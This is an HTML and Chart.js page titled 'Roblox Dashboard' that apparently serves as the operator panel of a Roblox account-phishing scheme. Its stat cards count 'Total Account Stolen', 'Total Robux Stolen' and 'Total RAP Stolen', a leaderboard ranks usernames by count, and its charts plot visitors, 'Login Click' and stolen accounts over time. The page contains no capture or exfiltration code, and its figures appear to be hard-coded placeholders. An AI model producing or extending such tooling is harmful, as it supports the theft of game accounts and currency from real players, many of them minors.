<!DOCTYPE html>
<html lang="en">
<head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Roblox Dashboard</title>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" integrity="sha512-9usAa10IRO0HhonpyAIVpjrylPvoDwiPUiKdWk5t3PyolY1cOd4DSE0Ga+ri4AuTroPR5aQvXU9xC6qOPnzFeg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
 <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
 <style>
 body {
 font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
 background-color: #121212;
 color: #fff;
 margin: 0;
 padding: 0;
 }


 .dashboard-container {
 width: 95%;
 max-width: 1200px;
 margin: 20px auto;
 padding: 20px;
 box-sizing: border-box;
 }


 .top-bar {
 background-color: #1e1e1e;
 padding: 15px;
 border-radius: 10px;
 margin-bottom: 20px;
 display: flex;
 justify-content: space-between;
 align-items: center;
 }


 .top-bar h1 {
 font-size: 1.5em;
 margin: 0;
 }


 .top-bar .profile {
 display: flex;
 align-items: center;
 }


 .top-bar .profile img {
 width: 40px;
 height: 40px;
 border-radius: 50%;
 margin-left: 10px;
 }


 .users-section {
 background-color: #1e1e1e;
 padding: 20px;
 border-radius: 10px;
 margin-bottom: 20px;
 }


 .user-list {
 list-style: none;
 padding: 0;
 margin: 0;
 }


 .user-list li {
 display: flex;
 justify-content: space-between;
 align-items: center;
 padding: 10px 0;
 border-bottom: 1px solid #333;
 }


 .user-list li:last-child {
 border-bottom: none;
 }


 .user-info {
 display: flex;
 align-items: center;
 }


 .user-info img {
 width: 30px;
 height: 30px;
 border-radius: 50%;
 margin-right: 10px;
 }


 .stats-section {
 display: grid;
 grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
 gap: 20px;
 margin-bottom: 20px;
 }


 .stat-card {
 background-color: #272727;
 padding: 15px;
 border-radius: 10px;
 text-align: center;
 }


 .stat-card h2 {
 font-size: 1.2em;
 margin: 5px 0;
 }


 .stat-card p {
 font-size: 1.5em;
 margin: 0;
 color: #ff4081;
 }


 .charts-section {
 background-color: #1e1e1e;
 padding: 20px;
 border-radius: 10px;
 }


 .chart-container {
 width: 100%;
 height: 300px;
 margin-bottom: 20px;
 }
 </style>
</head>
<body>
 <div class="dashboard-container">
 <div class="top-bar">
 <h1>Roblox Dashboard</h1>
 <div class="profile">
 <span>Username</span>
 <img src="https://via.placeholder.com/40" alt="Profile">
 </div>
 </div>


 <div class="users-section">
 <h2>Online Users</h2>
 <ul class="user-list">
 <li>
 <div class="user-info">
 <img src="https://via.placeholder.com/30" alt="User">
 <span>zinx___</span>
 </div>
 <span>6544</span>
 </li>
 <li>
 <div class="user-info">
 <img src="https://via.placeholder.com/30" alt="User">
 <span>jzcz</span>
 </div>
 <span>6487</span>
 </li>
 <li>
 <div class="user-info">
 <img src="https://via.placeholder.com/30" alt="User">
 <span>j6mezz.</span>
 </div>
 <span>5627</span>
 </li>
 <li>
 <div class="user-info">
 <img src="https://via.placeholder.com/30" alt="User">
 <span>qbf5</span>
 </div>
 <span>5596</span>
 </li>
 </ul>
 </div>


 <div class="stats-section">
 <div class="stat-card">
 <h2>Total Visitors</h2>
 <p>3014</p>
 </div>
 <div class="stat-card">
 <h2>Total Account Stolen</h2>
 <p>1112</p>
 </div>
 <div class="stat-card">
 <h2>Total Robux Stolen</h2>
 <p>R$ 101,682</p>
 </div>
 <div class="stat-card">
 <h2>Total RAP Stolen</h2>
 <p>R$ 40,271</p>
 </div>
 </div>


 <div class="charts-section">
 <h2>Robux & RAP</h2>
 <div class="chart-container">
 <canvas id="robuxRapChart"></canvas>
 </div>
 <h2>Visitor's & Login Click & Account Stolen</h2>
 <div class="chart-container">
 <canvas id="visitorLoginAccountChart"></canvas>
 </div>
 </div>
 </div>


 <script>
 // Robux & RAP Chart
 const robuxRapChartCanvas = document.getElementById('robuxRapChart').getContext('2d');
 const robuxRapChart = new Chart(robuxRapChartCanvas, {
 type: 'line',
 data: {
 labels: ['12/04/2025', '11/04/2025', '10/04/2025', '09/04/2025', '08/04/2025', '07/04/2025', '06/04/2025'],
 datasets: [{
 label: 'Robux',
 data: [0.6, 0.5, 0.7, 0.8, 0.6, 0.9, 1.0],
 borderColor: 'rgba(255, 99, 132, 1)',
 borderWidth: 2,
 fill: false
 }, {
 label: 'RAP',
 data: [0.3, 0.4, 0.5, 0.7, 0.4, 0.6, 0.8],
 borderColor: 'rgba(54, 162, 235, 1)',
 borderWidth: 2,
 fill: false
 }]
 },
 options: {
 scales: {
 y: {
 beginAtZero: true
 }
 }
 }
 });


 // Visitor's, Login Click & Account Stolen Chart
 const visitorLoginAccountChartCanvas = document.getElementById('visitorLoginAccountChart').getContext('2d');
 const visitorLoginAccountChart = new Chart(visitorLoginAccountChartCanvas, {
 type: 'line',
 data: {
 labels: ['12/04/2025', '11/04/2025', '10/04/2025', '09/04/2025', '08/04/2025', '07/04/2025', '06/04/2025'],
 datasets: [{
 label: 'Visitors',
 data: [0.4, 0.6, 0.8, 0.7, 0.5, 0.9, 1.0],
 borderColor: 'rgba(255, 206, 86, 1)',
 borderWidth: 2,
 fill: false
 }, {
 label: 'Login Click',
 data: [0.7, 0.5, 0.6, 0.4, 0.8, 0.7, 0.9],
 borderColor: 'rgba(75, 192, 192, 1)',
 borderWidth: 2,
 fill: false
 }, {
 label: 'Account Stolen',
 data: [0.2, 0.3, 0.4, 0.5, 0.3, 0.6, 0.7],
 borderColor: 'rgba(153, 102, 255, 1)',
 borderWidth: 2,
 fill: false
 }]
 },
 options: {
 scales: {
 y: {
 beginAtZero: true
 }
 }
 }
 });
 </script>
</body>
</html>
